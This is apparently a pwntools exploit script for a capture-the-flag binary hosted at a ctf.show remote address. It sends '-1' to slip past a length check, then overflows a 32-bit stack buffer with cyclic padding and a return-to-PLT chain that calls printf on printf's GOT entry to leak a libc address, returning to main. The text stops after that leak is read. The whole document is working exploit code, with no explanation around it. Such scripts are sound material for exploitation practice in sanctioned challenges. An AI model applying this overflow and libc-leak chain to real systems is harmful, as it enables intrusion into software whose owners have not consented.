from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28249)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/32bit/libc-2.27.so')
main = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
io.recvuntil('read?')
io.sendline('-1')
io.recvuntil('\n')
payload = cyclic(0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got)
io.sendline(payload)
io.recvuntil('\n')
printf = u32(io.recv(4))
